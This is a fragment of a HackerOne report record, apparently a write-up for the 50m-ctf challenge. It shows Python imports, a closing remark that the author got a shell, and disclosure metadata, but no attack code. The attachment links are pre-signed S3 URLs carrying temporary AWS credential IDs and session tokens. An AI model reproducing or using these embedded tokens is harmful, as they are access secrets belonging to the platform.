class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003eflask\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eFlask\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eabort\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eredirect\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003erender_template\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eResponse\u003c/span\u003e\n\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003ejinja2\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eTemplate\u003c/span\u003e\n\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003eweasyprint\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eHTML\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003ebase64\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ejson\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eos\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003erandom\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ere\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThanks for the great CTF! Even through it was a bit frustrating at times, I learnt a lot from it.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eI had shell on the machines, I also finished the CTF.\u003c/p\u003e\n","original_report_id":null,"original_report_url":null,"attachments":[{"id":439431,"file_name":"D0XoThpW0AE2r8S.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/431/cfe01f9a753eedf44f109caeda5182be92b81f94/D0XoThpW0AE2r8S.png?response-content-disposition=attachment%3B%20filename%3D%22D0XoThpW0AE2r8S.png%22%3B%20filename%2A%3DUTF-8%27%27D0XoThpW0AE2r8S.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3Q6GNRX4%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061159Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB%2F4DOSXz4Uk7JQqVyIKOhXYFqWTxcD44Z3HdHcn0dvKAiEA3PYdLzeI5Kv3E9WFbSVqd%2BUBlw0212Xg7H3tNiixN5gqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDIUObNP5fEX8bJXBsSqRA%2BL7Z0plmhSxsMHnrb83ftPuhWkgvNoQbpQ66ErJF8Tab4HbvnqeuplpQgE7hhKtqBYOEsdafEq0r9zNmqA7m92b%2BxDq63GNbNVm2hS%2FrGlDOjkNPC4s9Y9jvsKbOyEaodYyGTaNp7nXzoPtsVsXWu3VzjV5rY1%2FOniQ2%2B1s8ySEdTjZaRHk8P%2FwXbNfsl1hT2TAe2rleD%2BZ%2BVAaUzHyFNU%2F1mQkQNOozyUs%2B0kWyLXo4oDuk2v6G%2B%2B%2BOffGDFiu%2F5vFGTwCcw9LcpG50TBnwx2MYUfVFlGDhzFRqqeFnE8%2BVLdMRhVxgbXYhePjinuq12WCpDVAhCJNj8IR3wEJ1%2FQoonHq3u3s4Fjef1%2Bw%2BXtypskg56dqBrrGLe95zM0RechJC4u4kZN3x7RKFnUe%2BQTgA2fsU4g%2FeYbY51bNGPKZw3ELWdMZpvEwvawS7vQJcERLBBN%2FFBpdyPI7tU9GTieNVwCAMdziMkUN3bUc%2BsG8%2BbAIpsp1R0fqA4Zzh1fBBmHnAwvAA0nggtgLe0MkU7v1MNiFq%2F8FOusBRvYvRZdkMedUg2M4tNHIP5rUiGXbyy3g4wRqI3QxmX%2FtfXzpLdSUg3BMdPDmPj8jrIy0bzAIMzEhANIb5ri2Nz0%2FfFqmnJ3rjk8e005Fnv5uK088J0m7HFCYIe7hgj40pmM5UNmkGs30hxAnycAlyRaDL94ttdw5SqAS%2FW4MMrRVIliym5o9kruL0SoyWZC0kQciksSypgYXswzm%2BAeZve49Cnzr6ikwTN3S7tncfj0WMJznDG890QvBL3O7QjntIQ6Hf9oANAQjphy38wZSi3%2FB45i5bX5Kr2E9NKFLEy5UWui5G%2BmfVfaVyg%3D%3D\u0026X-Amz-Signature=c833a85359dbfe851206f891ec391fba6c70cfab4a986fd33f68060831f4933e","file_size":935868,"type":"image/png"},{"id":439432,"file_name":"tweet.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/432/a15822e09875f0ff7dbc8d3e5e9d72a52144db5d/tweet.png?response-content-disposition=attachment%3B%20filename%3D%22tweet.png%22%3B%20filename%2A%3DUTF-8%27%27tweet.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3Q6GNRX4%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061159Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB%2F4DOSXz4Uk7JQqVyIKOhXYFqWTxcD44Z3HdHcn0dvKAiEA3PYdLzeI5Kv3E9WFbSVqd%2BUBlw0212Xg7H3tNiixN5gqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDIUObNP5fEX8bJXBsSqRA%2BL7Z0plmhSxsMHnrb83ftPuhWkgvNoQbpQ66ErJF8Tab4HbvnqeuplpQgE7hhKtqBYOEsdafEq0r9zNmqA7m92b%2BxDq63GNbNVm2hS%2FrGlDOjkNPC4s9Y9jvsKbOyEaodYyGTaNp7nXzoPtsVsXWu3VzjV5rY1%2FOniQ2%2B1s8ySEdTjZaRHk8P%2FwXbNfsl1hT2TAe2rleD%2BZ%2BVAaUzHyFNU%2F1mQkQNOozyUs%2B0kWyLXo4oDuk2v6G%2B%2B%2BOffGDFiu%2F5vFGTwCcw9LcpG50TBnwx2MYUfVFlGDhzFRqqeFnE8%2BVLdMRhVxgbXYhePjinuq12WCpDVAhCJNj8IR3wEJ1%2FQoonHq3u3s4Fjef1%2Bw%2BXtypskg56dqBrrGLe95zM0RechJC4u4kZN3x7RKFnUe%2BQTgA2fsU4g%2FeYbY51bNGPKZw3ELWdMZpvEwvawS7vQJcERLBBN%2FFBpdyPI7tU9GTieNVwCAMdziMkUN3bUc%2BsG8%2BbAIpsp1R0fqA4Zzh1fBBmHnAwvAA0nggtgLe0MkU7v1MNiFq%2F8FOusBRvYvRZdkMedUg2M4tNHIP5rUiGXbyy3g4wRqI3QxmX%2FtfXzpLdSUg3BMdPDmPj8jrIy0bzAIMzEhANIb5ri2Nz0%2FfFqmnJ3rjk8e005Fnv5uK088J0m7HFCYIe7hgj40pmM5UNmkGs30hxAnycAlyRaDL94ttdw5SqAS%2FW4MMrRVIliym5o9kruL0SoyWZC0kQciksSypgYXswzm%2BAeZve49Cnzr6ikwTN3S7tncfj0WMJznDG890QvBL3O7QjntIQ6Hf9oANAQjphy38wZSi3%2FB45i5bX5Kr2E9NKFLEy5UWui5G%2BmfVfaVyg%3D%3D\u0026X-Amz-Signature=22fb6304b580a3d4e20dfd00e89d2d7259f25631e5781d991488b0a6e8014cda","file_size":473992,"type":"image/png"},{"id":439433,"file_name":"jadx-overview.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/433/bf3df189e3b5b384a821356769d6b6a7a1452f91/jadx-overview.png?response-content-disposition=attachment%3B%20filename%3D%22jadx-overview.png%22%3B%20filename%2A%3DUTF-8%27%27jadx-overview.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3Q6GNRX4%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061159Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB%2F4DOSXz4Uk7JQqVyIKOhXYFqWTxcD44Z3HdHcn0dvKAiEA3PYdLzeI5Kv3E9WFbSVqd%2BUBlw0212Xg7H3tNiixN5gqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDIUObNP5fEX8bJXBsSqRA%2BL7Z0plmhSxsMHnrb83ftPuhWkgvNoQbpQ66ErJF8Tab4HbvnqeuplpQgE7hhKtqBYOEsdafEq0r9zNmqA7m92b%2BxDq63GNbNVm2hS%2FrGlDOjkNPC4s9Y9jvsKbOyEaodYyGTaNp7nXzoPtsVsXWu3VzjV5rY1%2FOniQ2%2B1s8ySEdTjZaRHk8P%2FwXbNfsl1hT2TAe2rleD%2BZ%2BVAaUzHyFNU%2F1mQkQNOozyUs%2B0kWyLXo4oDuk2v6G%2B%2B%2BOffGDFiu%2F5vFGTwCcw9LcpG50TBnwx2MYUfVFlGDhzFRqqeFnE8%2BVLdMRhVxgbXYhePjinuq12WCpDVAhCJNj8IR3wEJ1%2FQoonHq3u3s4Fjef1%2Bw%2BXtypskg56dqBrrGLe95zM0RechJC4u4kZN3x7RKFnUe%2BQTgA2fsU4g%2FeYbY51bNGPKZw3ELWdMZpvEwvawS7vQJcERLBBN%2FFBpdyPI7tU9GTieNVwCAMdziMkUN3bUc%2BsG8%2BbAIpsp1R0fqA4Zzh1fBBmHnAwvAA0nggtgLe0MkU7v1MNiFq%2F8FOusBRvYvRZdkMedUg2M4tNHIP5rUiGXbyy3g4wRqI3QxmX%2FtfXzpLdSUg3BMdPDmPj8jrIy0bzAIMzEhANIb5ri2Nz0%2FfFqmnJ3rjk8e005Fnv5uK088J0m7HFCYIe7hgj40pmM5UNmkGs30hxAnycAlyRaDL94ttdw5SqAS%2FW4MMrRVIliym5o9kruL0SoyWZC0kQciksSypgYXswzm%2BAeZve49Cnzr6ikwTN3S7tncfj0WMJznDG890QvBL3O7QjntIQ6Hf9oANAQjphy38wZSi3%2FB45i5bX5Kr2E9NKFLEy5UWui5G%2BmfVfaVyg%3D%3D\u0026X-Amz-Signature=9b1e5f52dcbef922780298fd782d61a14bbc05631a80c4a404fcca1baec479a9","file_size":58316,"type":"image/png"},{"id":439435,"file_name":"pdf_attachment.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/435/0feddf3550cbe094e67b80c3cf1df52465f5c138/pdf_attachment.png?response-content-disposition=attachment%3B%20filename%3D%22pdf_attachment.png%22%3B%20filename%2A%3DUTF-8%27%27pdf_attachment.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3Q6GNRX4%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061159Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB%2F4DOSXz4Uk7JQqVyIKOhXYFqWTxcD44Z3HdHcn0dvKAiEA3PYdLzeI5Kv3E9WFbSVqd%2BUBlw0212Xg7H3tNiixN5gqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDIUObNP5fEX8bJXBsSqRA%2BL7Z0plmhSxsMHnrb83ftPuhWkgvNoQbpQ66ErJF8Tab4HbvnqeuplpQgE7hhKtqBYOEsdafEq0r9zNmqA7m92b%2BxDq63GNbNVm2hS%2FrGlDOjkNPC4s9Y9jvsKbOyEaodYyGTaNp7nXzoPtsVsXWu3VzjV5rY1%2FOniQ2%2B1s8ySEdTjZaRHk8P%2FwXbNfsl1hT2TAe2rleD%2BZ%2BVAaUzHyFNU%2F1mQkQNOozyUs%2B0kWyLXo4oDuk2v6G%2B%2B%2BOffGDFiu%2F5vFGTwCcw9LcpG50TBnwx2MYUfVFlGDhzFRqqeFnE8%2BVLdMRhVxgbXYhePjinuq12WCpDVAhCJNj8IR3wEJ1%2FQoonHq3u3s4Fjef1%2Bw%2BXtypskg56dqBrrGLe95zM0RechJC4u4kZN3x7RKFnUe%2BQTgA2fsU4g%2FeYbY51bNGPKZw3ELWdMZpvEwvawS7vQJcERLBBN%2FFBpdyPI7tU9GTieNVwCAMdziMkUN3bUc%2BsG8%2BbAIpsp1R0fqA4Zzh1fBBmHnAwvAA0nggtgLe0MkU7v1MNiFq%2F8FOusBRvYvRZdkMedUg2M4tNHIP5rUiGXbyy3g4wRqI3QxmX%2FtfXzpLdSUg3BMdPDmPj8jrIy0bzAIMzEhANIb5ri2Nz0%2FfFqmnJ3rjk8e005Fnv5uK088J0m7HFCYIe7hgj40pmM5UNmkGs30hxAnycAlyRaDL94ttdw5SqAS%2FW4MMrRVIliym5o9kruL0SoyWZC0kQciksSypgYXswzm%2BAeZve49Cnzr6ikwTN3S7tncfj0WMJznDG890QvBL3O7QjntIQ6Hf9oANAQjphy38wZSi3%2FB45i5bX5Kr2E9NKFLEy5UWui5G%2BmfVfaVyg%3D%3D\u0026X-Amz-Signature=509a1791b2c7d9c0395fecb8c435d21c76150ee83473ca96e90b9f603e2f6a4b","file_size":33101,"type":"image/png"}],"allow_singular_disclosure_at":"2019-05-08T15:55:08.594Z","allow_singular_disclosure_after":-51891410.79464683,"singular_disclosure_allowed":true,"vote_count":7,"voters":["nytr0gen","checkm50","mygf","globalenigma","seajay","kumbha","sampriti"],"severity":{"rating":"none","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4492850,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for the amazing report! We'll be announcing the winners shortly, so we'll let you know if you're one of the reports selected. Going to close this and then request public disclosure now.","markdown_message":"\u003cp\u003eThank you for the amazing report! We\u0026#39;ll be announcing the winners shortly, so we\u0026#39;ll let you know if you\u0026#39;re one of the reports selected. Going to close this and then request public disclosure now.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-05T18:34:33.541Z","updated_at":"2019-04-05T18:34:33.541Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"sampriti","url":"/sampriti"},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509087,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-08T15:55:08.566Z","updated_at":"2019-04-08T15:55:08.566Z","first_to_agree":true,"actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509088,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-08T15:55:17.020Z","updated_at":"2019-04-08T15:55:17.020Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}